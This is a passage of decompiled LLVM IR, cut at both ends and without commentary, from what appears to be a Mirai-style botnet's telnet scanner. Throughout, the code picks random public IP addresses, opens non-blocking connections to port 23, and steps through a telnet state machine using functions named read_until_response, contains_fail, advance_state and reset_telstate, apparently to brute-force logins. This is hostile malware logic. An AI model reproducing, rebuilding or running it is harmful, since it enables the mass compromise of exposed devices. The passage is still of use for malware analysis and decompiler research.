  store i32 %v1_804a25c, i32* %eax.global-to-local, align 4
  %v0_804a25f = load i32, i32* %edx.global-to-local, align 4
  %v2_804a25f = inttoptr i32 %v1_804a25c to i32*
  store i32 %v0_804a25f, i32* %v2_804a25f, align 4
  %v0_804a261 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a261 = add i32 %v0_804a261, 4
  store i32 %v1_804a261, i32* %eax.global-to-local, align 4
  %v0_804a264 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a264 = inttoptr i32 %v1_804a261 to i32*
  store i32 %v0_804a264, i32* %v2_804a264, align 4
  %v0_804a266 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a266 = add i32 %v0_804a266, 4
  store i32 %v1_804a266, i32* %eax.global-to-local, align 4
  %v0_804a269 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a269 = inttoptr i32 %v1_804a266 to i32*
  store i32 %v0_804a269, i32* %v2_804a269, align 4
  %v0_804a26b = load i32, i32* %eax.global-to-local, align 4
  %v1_804a26b = add i32 %v0_804a26b, 4
  %v0_804a26e = load i32, i32* %edx.global-to-local, align 4
  %v2_804a26e = inttoptr i32 %v1_804a26b to i32*
  store i32 %v0_804a26e, i32* %v2_804a26e, align 4
  store i32 %v1_804a22a, i32* %edx.global-to-local, align 4
  store i32 %v2_804a22d, i32* @eax, align 4
  store i32 %v2_804a22d, i32* %v1_804a22d, align 4
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804a293 = call i32 @GetRandomPublicIP(i32 %v6_804a1c3)
  %v0_804a29d = load i32, i32* @ebx, align 4
  %v1_804a29f = mul i32 %v0_804a29d, 4
  store i32 %v1_804a29f, i32* %edx.global-to-local, align 4
  %v2_804a2ad = mul i32 %v0_804a29d, 28
  %v2_804a2af = add i32 %v2_804a2ad, %v2_804a07d
  %v1_804a2b1 = add i32 %v2_804a2af, 4
  store i32 %v1_804a2b1, i32* %eax.global-to-local, align 4
  %v2_804a2b4 = inttoptr i32 %v1_804a2b1 to i32*
  store i32 %v1_804a293, i32* %v2_804a2b4, align 4
  br label %dec_label_pc_804a34d

dec_label_pc_804a2bb:                             ; preds = %dec_label_pc_804a1f0
  %v5_804a2d1 = load i8, i8* %v4_804a206, align 1
  %v6_804a2d1 = zext i8 %v5_804a2d1 to i32
  %v9_804a2d1 = or i32 %v6_804a2d1, %v8_804a1c3
  store i32 %v9_804a2d1, i32* %eax.global-to-local, align 4
  %v4_804a2d5 = icmp eq i8 %v5_804a2d1, 0
  %v1_804a2d7 = icmp eq i1 %v4_804a2d5, false
  br i1 %v1_804a2d7, label %dec_label_pc_804a34d, label %dec_label_pc_804a2d9

dec_label_pc_804a2d9:                             ; preds = %dec_label_pc_804a2bb
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a2f1 = add i32 %v2_804a2f1, %v2_804a172
  %v4_804a2f1 = inttoptr i32 %v3_804a2f1 to i8*
  %v5_804a2f1 = load i8, i8* %v4_804a2f1, align 1
  %v1_804a2f5 = add i8 %v5_804a2f1, 1
  store i8 %v1_804a2f5, i8* %v4_804a2f1, align 1
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a32b = add i32 %v2_804a32b, %v2_804a172
  %v4_804a32b = inttoptr i32 %v3_804a32b to i8*
  %v5_804a32b = load i8, i8* %v4_804a32b, align 2
  %v6_804a32b = zext i8 %v5_804a32b to i32
  %v9_804a32b = or i32 %v6_804a32b, %v8_804a1c3
  %v1_804a32f = add i32 %v9_804a32b, 1
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  store i32 %v1_804a32f, i32* %edx.global-to-local, align 4
  %v1_804a349 = trunc i32 %v1_804a32f to i8
  store i8 %v1_804a349, i8* %v4_804a32b, align 2
  br label %dec_label_pc_804a34d

dec_label_pc_804a34d:                             ; preds = %dec_label_pc_804a2bb, %dec_label_pc_804a212, %dec_label_pc_804a2d9
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804a356 = load i32, i32* @esp, align 4
  %v1_804a359 = add i32 %v0_804a356, -16
  %v2_804a359 = inttoptr i32 %v1_804a359 to i32*
  store i32 23, i32* %v2_804a359, align 4
  %v0_804a35b = load i32, i32* %stack_var_-604, align 4
  %v1_804a35b = call i32 @htons(i32 %v0_804a35b)
  %v0_804a360 = load i32, i32* @esp, align 4
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  %v1_804a398 = add i32 %v2_804a174, 4
  store i32 %v1_804a398, i32* %eax.global-to-local, align 4
  %v1_804a39b = inttoptr i32 %v1_804a398 to i32*
  %v2_804a39b = load i32, i32* %v1_804a39b, align 4
  store i32 %v2_804a39b, i32* %eax.global-to-local, align 4
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804a3a9 = add i32 %v0_804a360, 8
  %v2_804a3a9 = inttoptr i32 %v1_804a3a9 to i32*
  store i32 0, i32* %v2_804a3a9, align 4
  %v1_804a3ab = add i32 %v0_804a360, 4
  %v2_804a3ab = inttoptr i32 %v1_804a3ab to i32*
  store i32 1, i32* %v2_804a3ab, align 4
  %v2_804a3ad = inttoptr i32 %v0_804a360 to i32*
  store i32 2, i32* %v2_804a3ad, align 4
  %v2_804a3af = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v1_804a35b, 65536
  %v3_804a3af = sdiv i32 %sext, 65536
  %v4_804a3af = call i32 @socket(i32 %v3_804a3af, i32 %v2_804a39b, i32 %v2_804a3af)
  store i32 %v4_804a3af, i32* @esi, align 4
  %v0_804a3bc = load i32, i32* @ebx, align 4
  %v2_804a3cc = mul i32 %v0_804a3bc, 28
  %v3_804a3ce = add i32 %v2_804a3cc, %v2_804a07d
  %v4_804a3ce = inttoptr i32 %v3_804a3ce to i32*
  store i32 %v4_804a3af, i32* %v4_804a3ce, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a3e7 = inttoptr i32 %v2_804a174 to i32*
  %v4_804a3e7 = load i32, i32* %v3_804a3e7, align 4
  store i32 %v4_804a3e7, i32* %eax.global-to-local, align 4
  %v10_804a3ea = icmp eq i32 %v4_804a3e7, -1
  br i1 %v10_804a3ea, label %dec_label_pc_804b021, label %dec_label_pc_804a3f3

dec_label_pc_804a3f3:                             ; preds = %dec_label_pc_804a34d
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a409 = load i32, i32* %v3_804a3e7, align 4
  store i32 %v4_804a409, i32* %eax.global-to-local, align 4
  %v0_804a40c = load i32, i32* @esp, align 4
  %v1_804a40f = add i32 %v0_804a40c, -8
  %v2_804a40f = inttoptr i32 %v1_804a40f to i32*
  store i32 0, i32* %v2_804a40f, align 4
  %v1_804a411 = add i32 %v0_804a40c, -12
  %v2_804a411 = inttoptr i32 %v1_804a411 to i32*
  store i32 3, i32* %v2_804a411, align 4
  %v0_804a413 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a413 = add i32 %v0_804a40c, -16
  %v3_804a413 = inttoptr i32 %v2_804a413 to i32*
  store i32 %v0_804a413, i32* %v3_804a413, align 4
  %v1_804a414 = load i32, i32* %stack_var_-596, align 4
  %v3_804a414 = call i32 @__libc_fcntl(i32 %v2_804a39b, i32 %v1_804a414, i32 0)
  %v0_804a419 = load i32, i32* @esp, align 4
  %v12_804a41e = or i32 %v3_804a414, 2048
  store i32 %v12_804a41e, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a437 = load i32, i32* %v3_804a3e7, align 4
  store i32 %v4_804a437, i32* %eax.global-to-local, align 4
  %v2_804a43d = add i32 %v0_804a419, 8
  %v3_804a43d = inttoptr i32 %v2_804a43d to i32*
  store i32 %v12_804a41e, i32* %v3_804a43d, align 4
  %v1_804a43e = add i32 %v0_804a419, 4
  %v2_804a43e = inttoptr i32 %v1_804a43e to i32*
  store i32 4, i32* %v2_804a43e, align 4
  %v0_804a440 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a440 = inttoptr i32 %v0_804a419 to i32*
  store i32 %v0_804a440, i32* %v3_804a440, align 4
  %v1_804a441 = load i32, i32* %stack_var_-596, align 4
  %v3_804a441 = call i32 @__libc_fcntl(i32 %v2_804a39b, i32 %v1_804a441, i32 0)
  %v0_804a446 = load i32, i32* @esp, align 4
  store i32 %v2_804a00b, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a465 = load i32, i32* %v3_804a3e7, align 4
  store i32 %v4_804a465, i32* %eax.global-to-local, align 4
  %v1_804a46b = add i32 %v0_804a446, 8
  %v2_804a46b = inttoptr i32 %v1_804a46b to i32*
  store i32 16, i32* %v2_804a46b, align 4
  %v2_804a46d = add i32 %v0_804a446, 4
  %v3_804a46d = inttoptr i32 %v2_804a46d to i32*
  store i32 %v2_804a00b, i32* %v3_804a46d, align 4
  %v0_804a46e = load i32, i32* %eax.global-to-local, align 4
  %v3_804a46e = inttoptr i32 %v0_804a446 to i32*
  store i32 %v0_804a46e, i32* %v3_804a46e, align 4
  %v1_804a46f = load i32, i32* %stack_var_-596, align 4
  %v3_804a46f = call i32 @__libc_connect(i32 %v2_804a39b, i32 %v1_804a46f, i32 0)
  store i32 %v3_804a46f, i32* %eax.global-to-local, align 4
  %v0_804a474 = load i32, i32* @esp, align 4
  %v1_804a474 = add i32 %v0_804a474, 16
  %v10_804a477 = icmp eq i32 %v3_804a46f, -1
  %v1_804a47a = icmp eq i1 %v10_804a477, false
  br i1 %v1_804a47a, label %dec_label_pc_804a4b2, label %dec_label_pc_804a47c

dec_label_pc_804a47c:                             ; preds = %dec_label_pc_804a3f3
  %v1_804a47c = call i32 @__errno_location(i32 %v2_804a39b)
  store i32 %v1_804a47c, i32* %eax.global-to-local, align 4
  %v1_804a481 = inttoptr i32 %v1_804a47c to i32*
  %v2_804a481 = load i32, i32* %v1_804a481, align 4
  store i32 %v2_804a481, i32* %eax.global-to-local, align 4
  %v9_804a483 = icmp eq i32 %v2_804a481, 115
  br i1 %v9_804a483, label %dec_label_pc_804a47c.dec_label_pc_804a4b2_crit_edge, label %dec_label_pc_804a488

dec_label_pc_804a47c.dec_label_pc_804a4b2_crit_edge: ; preds = %dec_label_pc_804a47c
  %v0_804a4cb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a4b2

dec_label_pc_804a488:                             ; preds = %dec_label_pc_804a47c
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v0_804a4a1 = load i32, i32* @esp, align 4
  %v2_804a4a4 = add i32 %v0_804a4a1, -16
  %v3_804a4a4 = inttoptr i32 %v2_804a4a4 to i32*
  store i32 %v2_804a174, i32* %v3_804a4a4, align 4
  %v1_804a4a5 = call i32 @reset_telstate(i32 %v2_804a39b)
  store i32 %v1_804a4a5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804a4b2:                             ; preds = %dec_label_pc_804a47c.dec_label_pc_804a4b2_crit_edge, %dec_label_pc_804a3f3
  %v0_804a4cb = phi i32 [ %v0_804a4cb.pre, %dec_label_pc_804a47c.dec_label_pc_804a4b2_crit_edge ], [ %v1_804a474, %dec_label_pc_804a3f3 ]
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804a4ce = add i32 %v0_804a4cb, -12
  %v2_804a4ce = inttoptr i32 %v1_804a4ce to i32*
  store i32 1, i32* %v2_804a4ce, align 4
  %v0_804a4d0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a4d0 = add i32 %v0_804a4cb, -16
  %v3_804a4d0 = inttoptr i32 %v2_804a4d0 to i32*
  store i32 %v0_804a4d0, i32* %v3_804a4d0, align 4
  %v1_804a4d1 = load i32, i32* %stack_var_-596, align 4
  %v2_804a4d1 = inttoptr i32 %v2_804a39b to i32*
  %v3_804a4d1 = call i32 @advance_state(i32* %v2_804a4d1, i32 %v1_804a4d1)
  store i32 %v3_804a4d1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804a4de:                             ; preds = %dec_label_pc_804a1ad
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804a4e8, i32* @edi, align 4
  %v5_804a4ef = call i8* @_memset(i8* %tmp38, i32 0, i32 32)
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a50d = inttoptr i32 %v2_804a174 to i32*
  %v4_804a50d = load i32, i32* %v3_804a50d, align 4
  %v2_804a512 = udiv i32 %v4_804a50d, 32
  store i32 %v2_804a512, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a52b = load i32, i32* %v3_804a50d, align 4
  %v1_804a52e = urem i32 %v4_804a52b, 32
  store i32 %v1_804a52e, i32* %eax.global-to-local, align 4
  %v0_804a531 = load i32, i32* @ebp, align 4
  %v2_804a531 = mul nuw nsw i32 %v2_804a512, 4
  %v3_804a531 = add nsw i32 %v2_804a531, -312
  %v4_804a531 = add i32 %v3_804a531, %v0_804a531
  %v5_804a531 = inttoptr i32 %v4_804a531 to i32*
  %v6_804a531 = load i32, i32* %v5_804a531, align 4
  %v9_804a531 = shl i32 1, %v1_804a52e
  %v12_804a531 = or i32 %v6_804a531, %v9_804a531
  store i32 %v12_804a531, i32* %v5_804a531, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a562 = load i32, i32* %v3_804a50d, align 4
  %v1_804a565 = add i32 %v4_804a562, 1
  store i32 %v1_804a565, i32* %edx.global-to-local, align 4
  %v0_804a568 = load i32, i32* @esp, align 4
  %v2_804a571 = add i32 %v0_804a568, -16
  %v3_804a571 = inttoptr i32 %v2_804a571 to i32*
  store i32 %v2_804a56b, i32* %v3_804a571, align 4
  %v1_804a572 = add i32 %v0_804a568, -20
  %v2_804a572 = inttoptr i32 %v1_804a572 to i32*
  store i32 0, i32* %v2_804a572, align 4
  store i32 %v2_804a4e8, i32* %eax.global-to-local, align 4
  %v2_804a57a = add i32 %v0_804a568, -24
  %v3_804a57a = inttoptr i32 %v2_804a57a to i32*
  store i32 %v2_804a4e8, i32* %v3_804a57a, align 4
  %v1_804a57b = add i32 %v0_804a568, -28
  %v2_804a57b = inttoptr i32 %v1_804a57b to i32*
  store i32 0, i32* %v2_804a57b, align 4
  %v0_804a57d = load i32, i32* %edx.global-to-local, align 4
  %v2_804a57d = add i32 %v0_804a568, -32
  %v3_804a57d = inttoptr i32 %v2_804a57d to i32*
  store i32 %v0_804a57d, i32* %v3_804a57d, align 4
  %v0_804a57e = load i32, i32* %stack_var_-324, align 4
  %v2_804a57e = load i32, i32* %stack_var_-316, align 4
  %v5_804a57e = call i32 @__libc_select(i32 %v0_804a57e, i32 %arg1, i32 %v2_804a57e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804a57e, i32* %eax.global-to-local, align 4
  %v0_804a583 = load i32, i32* @esp, align 4
  %v12_804a589 = icmp eq i32 %v5_804a57e, 1
  %v1_804a58d = icmp eq i1 %v12_804a589, false
  br i1 %v1_804a58d, label %dec_label_pc_804a694, label %dec_label_pc_804a593

dec_label_pc_804a593:                             ; preds = %dec_label_pc_804a4de
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a5bd = load i32, i32* %v3_804a50d, align 4
  store i32 %v4_804a5bd, i32* %edx.global-to-local, align 4
  %v2_804a5c9 = add i32 %v0_804a583, 16
  %v3_804a5c9 = inttoptr i32 %v2_804a5c9 to i32*
  store i32 %v2_804a5c3, i32* %v3_804a5c9, align 4
  store i32 %v2_804a5ca, i32* %eax.global-to-local, align 4
  %v2_804a5d0 = add i32 %v0_804a583, 12
  %v3_804a5d0 = inttoptr i32 %v2_804a5d0 to i32*
  store i32 %v2_804a5ca, i32* %v3_804a5d0, align 4
  %v1_804a5d1 = add i32 %v0_804a583, 8
  %v2_804a5d1 = inttoptr i32 %v1_804a5d1 to i32*
  store i32 4, i32* %v2_804a5d1, align 4
  %v1_804a5d3 = add i32 %v0_804a583, 4
  %v2_804a5d3 = inttoptr i32 %v1_804a5d3 to i32*
  store i32 1, i32* %v2_804a5d3, align 4
  %v0_804a5d5 = load i32, i32* %edx.global-to-local, align 4
  %v3_804a5d5 = inttoptr i32 %v0_804a583 to i32*
  store i32 %v0_804a5d5, i32* %v3_804a5d5, align 4
  %v0_804a5d6 = load i32, i32* %stack_var_-332, align 4
  %v1_804a5d6 = load i32, i32* %stack_var_-328, align 4
  %v2_804a5d6 = load i32, i32* %stack_var_-324, align 4
  %v4_804a5d6 = load i32, i32* %stack_var_-316, align 4
  %v5_804a5d6 = call i32 @getsockopt(i32 %v0_804a5d6, i32 %v1_804a5d6, i32 %v2_804a5d6, i32 %arg1, i32 %v4_804a5d6)
  %v0_804a5db = load i32, i32* @esp, align 4
  %v3_804a5de = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_804a5de, i32* %eax.global-to-local, align 4
  %v1_804a5e4 = icmp eq i32 %v3_804a5de, 0
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804a5e4, label %dec_label_pc_804a612, label %dec_label_pc_804a5e8

dec_label_pc_804a5e8:                             ; preds = %dec_label_pc_804a593
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v2_804a604 = add i32 %v0_804a5db, 16
  %v3_804a604 = inttoptr i32 %v2_804a604 to i32*
  store i32 %v2_804a174, i32* %v3_804a604, align 4
  %v0_804a605 = load i32, i32* %stack_var_-332, align 4
  %v1_804a605 = call i32 @reset_telstate(i32 %v0_804a605)
  store i32 %v1_804a605, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804a612:                             ; preds = %dec_label_pc_804a593
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a628 = load i32, i32* %v3_804a50d, align 4
  store i32 %v4_804a628, i32* %eax.global-to-local, align 4
  %v1_804a62e = add i32 %v0_804a5db, 24
  %v2_804a62e = inttoptr i32 %v1_804a62e to i32*
  store i32 0, i32* %v2_804a62e, align 4
  %v1_804a630 = add i32 %v0_804a5db, 20
  %v2_804a630 = inttoptr i32 %v1_804a630 to i32*
  store i32 3, i32* %v2_804a630, align 4
  %v0_804a632 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a632 = add i32 %v0_804a5db, 16
  %v3_804a632 = inttoptr i32 %v2_804a632 to i32*
  store i32 %v0_804a632, i32* %v3_804a632, align 4
  %v0_804a633 = load i32, i32* %stack_var_-332, align 4
  %v1_804a633 = load i32, i32* %stack_var_-328, align 4
  %v2_804a633 = load i32, i32* %stack_var_-324, align 4
  %v3_804a633 = call i32 @__libc_fcntl(i32 %v0_804a633, i32 %v1_804a633, i32 %v2_804a633)
  %v0_804a638 = load i32, i32* @esp, align 4
  %v13_804a63d = and i32 %v3_804a633, -2049
  store i32 %v13_804a63d, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a656 = load i32, i32* %v3_804a50d, align 4
  store i32 %v4_804a656, i32* %eax.global-to-local, align 4
  %v2_804a65c = add i32 %v0_804a638, 8
  %v3_804a65c = inttoptr i32 %v2_804a65c to i32*
  store i32 %v13_804a63d, i32* %v3_804a65c, align 4
  %v1_804a65d = add i32 %v0_804a638, 4
  %v2_804a65d = inttoptr i32 %v1_804a65d to i32*
  store i32 4, i32* %v2_804a65d, align 4
  %v0_804a65f = load i32, i32* %eax.global-to-local, align 4
  %v3_804a65f = inttoptr i32 %v0_804a638 to i32*
  store i32 %v0_804a65f, i32* %v3_804a65f, align 4
  %v0_804a660 = load i32, i32* %stack_var_-332, align 4
  %v1_804a660 = load i32, i32* %stack_var_-328, align 4
  %v2_804a660 = load i32, i32* %stack_var_-324, align 4
  %v3_804a660 = call i32 @__libc_fcntl(i32 %v0_804a660, i32 %v1_804a660, i32 %v2_804a660)
  %v0_804a665 = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804a684 = add i32 %v0_804a665, 4
  %v2_804a684 = inttoptr i32 %v1_804a684 to i32*
  store i32 2, i32* %v2_804a684, align 4
  %v0_804a686 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a686 = inttoptr i32 %v0_804a665 to i32*
  store i32 %v0_804a686, i32* %v3_804a686, align 4
  %v0_804a687 = load i32, i32* %stack_var_-332, align 4
  %v1_804a687 = load i32, i32* %stack_var_-328, align 4
  %v2_804a687 = inttoptr i32 %v0_804a687 to i32*
  %v3_804a687 = call i32 @advance_state(i32* %v2_804a687, i32 %v1_804a687)
  store i32 %v3_804a687, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804a694:                             ; preds = %dec_label_pc_804a4de
  %v13_804a694 = icmp eq i32 %v5_804a57e, -1
  %v1_804a698 = icmp eq i1 %v13_804a694, false
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804a698, label %dec_label_pc_804a6c4, label %dec_label_pc_804a69a

dec_label_pc_804a69a:                             ; preds = %dec_label_pc_804a694
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v2_804a6b6 = add i32 %v0_804a583, 16
  %v3_804a6b6 = inttoptr i32 %v2_804a6b6 to i32*
  store i32 %v2_804a174, i32* %v3_804a6b6, align 4
  %v1_804a6b7 = call i32 @reset_telstate(i32 %v5_804a57e)
  store i32 %v1_804a6b7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804a6c4:                             ; preds = %dec_label_pc_804a694
  store i32 %v1_804a176, i32* %eax.global-to-local, align 4
  %v2_804a6df = load i32, i32* %v1_804a179, align 4
  store i32 %v2_804a6df, i32* %eax.global-to-local, align 4
  %v1_804a6e1 = add i32 %v2_804a6df, 5
  store i32 %v1_804a6e1, i32* @ebx, align 4
  %v1_804a6e7 = add i32 %v0_804a583, 16
  %v2_804a6e7 = inttoptr i32 %v1_804a6e7 to i32*
  store i32 0, i32* %v2_804a6e7, align 4
  %v1_804a6e9 = inttoptr i32 %v5_804a57e to i32*
  %v2_804a6e9 = call i32 @__GI_time(i32* %v1_804a6e9)
  store i32 %v2_804a6e9, i32* %eax.global-to-local, align 4
  %v0_804a6f1 = load i32, i32* @ebx, align 4
  %v7_804a6f1 = icmp ult i32 %v0_804a6f1, %v2_804a6e9
  %v1_804a6f3 = icmp eq i1 %v7_804a6f1, false
  br i1 %v1_804a6f3, label %dec_label_pc_804b021, label %dec_label_pc_804a6f9

dec_label_pc_804a6f9:                             ; preds = %dec_label_pc_804a6c4
  %v0_804a6ee = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804a715 = inttoptr i32 %v0_804a6ee to i32*
  store i32 %v2_804a174, i32* %v3_804a715, align 4
  %v0_804a716 = load i32, i32* %stack_var_-332, align 4
  %v1_804a716 = call i32 @reset_telstate(i32 %v0_804a716)
  store i32 %v1_804a716, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804a723:                             ; preds = %dec_label_pc_804a1ad
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  %v1_804a73b = add i32 %v2_804a174, 24
  store i32 %v1_804a73b, i32* %eax.global-to-local, align 4
  %v1_804a73e = inttoptr i32 %v1_804a73b to i32*
  %v2_804a73e = load i32, i32* %v1_804a73e, align 4
  store i32 %v2_804a73e, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a756 = inttoptr i32 %v2_804a174 to i32*
  %v4_804a756 = load i32, i32* %v3_804a756, align 4
  store i32 %v4_804a756, i32* %eax.global-to-local, align 4
  %v0_804a759 = load i32, i32* @esp, align 4
  %v1_804a75c = add i32 %v0_804a759, -16
  %v2_804a75c = inttoptr i32 %v1_804a75c to i32*
  store i32 134585900, i32* %v2_804a75c, align 4
  %v1_804a761 = add i32 %v0_804a759, -20
  %v2_804a761 = inttoptr i32 %v1_804a761 to i32*
  store i32 1024, i32* %v2_804a761, align 4
  %v0_804a766 = load i32, i32* @ebx, align 4
  %v2_804a766 = add i32 %v0_804a759, -24
  %v3_804a766 = inttoptr i32 %v2_804a766 to i32*
  store i32 %v0_804a766, i32* %v3_804a766, align 4
  %v5_804a767 = add i32 %v0_804a759, -28
  %v6_804a767 = inttoptr i32 %v5_804a767 to i32*
  store i32 %arg1, i32* %v6_804a767, align 4
  %v0_804a76a = load i32, i32* %eax.global-to-local, align 4
  %v2_804a76a = add i32 %v0_804a759, -32
  %v3_804a76a = inttoptr i32 %v2_804a76a to i32*
  store i32 %v0_804a76a, i32* %v3_804a76a, align 4
  %v1_804a76b = call i32 @read_until_response(i32 %v6_804a1c3)
  %v0_804a770 = load i32, i32* @esp, align 4
  %v1_804a773 = icmp eq i32 %v1_804a76b, 0
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  br i1 %v1_804a773, label %dec_label_pc_804a800, label %dec_label_pc_804a77b

dec_label_pc_804a77b:                             ; preds = %dec_label_pc_804a723
  store i32 %v1_804a73b, i32* %eax.global-to-local, align 4
  %v2_804a796 = load i32, i32* %v1_804a73e, align 4
  store i32 %v2_804a796, i32* %eax.global-to-local, align 4
  %v2_804a79b = add i32 %v0_804a770, 16
  %v3_804a79b = inttoptr i32 %v2_804a79b to i32*
  store i32 %v2_804a796, i32* %v3_804a79b, align 4
  %v0_804a79c = load i32, i32* %stack_var_-332, align 4
  %v1_804a79c = call i32 @contains_fail(i32 %v0_804a79c)
  %v0_804a7a1 = load i32, i32* @esp, align 4
  %v1_804a7a4 = icmp eq i32 %v1_804a79c, 0
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804a7f0 = add i32 %v0_804a7a1, 4
  %v2_804a7f0 = inttoptr i32 %v1_804a7f0 to i32*
  br i1 %v1_804a7a4, label %dec_label_pc_804a7d4, label %dec_label_pc_804a7a8

dec_label_pc_804a7a8:                             ; preds = %dec_label_pc_804a77b
  store i32 0, i32* %v2_804a7f0, align 4
  %v0_804a7c6 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a7c6 = inttoptr i32 %v0_804a7a1 to i32*
  store i32 %v0_804a7c6, i32* %v3_804a7c6, align 4
  %v0_804a7c7 = load i32, i32* %stack_var_-332, align 4
  %v1_804a7c7 = load i32, i32* %stack_var_-328, align 4
  %v2_804a7c7 = inttoptr i32 %v0_804a7c7 to i32*
  %v3_804a7c7 = call i32 @advance_state(i32* %v2_804a7c7, i32 %v1_804a7c7)
  store i32 %v3_804a7c7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804a7d4:                             ; preds = %dec_label_pc_804a77b
  store i32 3, i32* %v2_804a7f0, align 4
  %v0_804a7f2 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a7f2 = inttoptr i32 %v0_804a7a1 to i32*
  store i32 %v0_804a7f2, i32* %v3_804a7f2, align 4
  %v0_804a7f3 = load i32, i32* %stack_var_-332, align 4
  %v1_804a7f3 = load i32, i32* %stack_var_-328, align 4
  %v2_804a7f3 = inttoptr i32 %v0_804a7f3 to i32*
  %v3_804a7f3 = call i32 @advance_state(i32* %v2_804a7f3, i32 %v1_804a7f3)
  store i32 %v3_804a7f3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804a800:                             ; preds = %dec_label_pc_804a723
  store i32 %v1_804a176, i32* %eax.global-to-local, align 4
  %v2_804a81b = load i32, i32* %v1_804a179, align 4
  store i32 %v2_804a81b, i32* %eax.global-to-local, align 4
  %v1_804a81d = add i32 %v2_804a81b, 7
  store i32 %v1_804a81d, i32* @ebx, align 4
  %v1_804a823 = add i32 %v0_804a770, 16
  %v2_804a823 = inttoptr i32 %v1_804a823 to i32*
  store i32 0, i32* %v2_804a823, align 4
  %v0_804a825 = load i32, i32* %stack_var_-332, align 4
  %v1_804a825 = inttoptr i32 %v0_804a825 to i32*
  %v2_804a825 = call i32 @__GI_time(i32* %v1_804a825)
  store i32 %v2_804a825, i32* %eax.global-to-local, align 4
  %v0_804a82d = load i32, i32* @ebx, align 4
  %v7_804a82d = icmp ult i32 %v0_804a82d, %v2_804a825
  %v1_804a82f = icmp eq i1 %v7_804a82d, false
  br i1 %v1_804a82f, label %dec_label_pc_804b021, label %dec_label_pc_804a835

dec_label_pc_804a835:                             ; preds = %dec_label_pc_804a800
  %v0_804a82a = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804a851 = inttoptr i32 %v0_804a82a to i32*
